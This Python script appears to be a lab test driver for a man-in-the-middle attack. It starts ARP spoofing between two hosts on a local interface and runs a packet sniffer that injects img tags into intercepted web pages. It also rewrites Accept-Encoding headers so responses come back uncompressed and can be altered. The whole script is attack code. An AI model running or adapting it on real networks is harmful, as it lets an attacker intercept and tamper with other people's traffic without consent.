from accept_encoding_substituter import AcceptEncodingSubstituter
from PacketHandler.Injectors.img_tag_injector import ImgTagInjector
from PacketHandler.packet_sniffer import PacketSniffer
from arp_spoof import ArpSpoof
from ip_to_mac_mapper import IpToMacMapper

# Mock the network mapping
mapping = IpToMacMapper().set_all({
    '192.168.56.101': '08:00:27:B0:A1:AB',
    '192.168.56.102': '08:00:27:C6:A4:61',
})

arp = ArpSpoof('enp0s3', '192.168.56.101', '192.168.56.102')
arp.start()

packet_sniffer = PacketSniffer(['192.168.56.103'], mapping, 'enp0s3')
packet_sniffer.packet_injectors.append(ImgTagInjector())
packet_sniffer.packet_injectors.append(AcceptEncodingSubstituter()) # Prevent the pages from being served with compression
packet_sniffer.start()

arp.join()
packet_sniffer.join()

# @todo convert into an automated test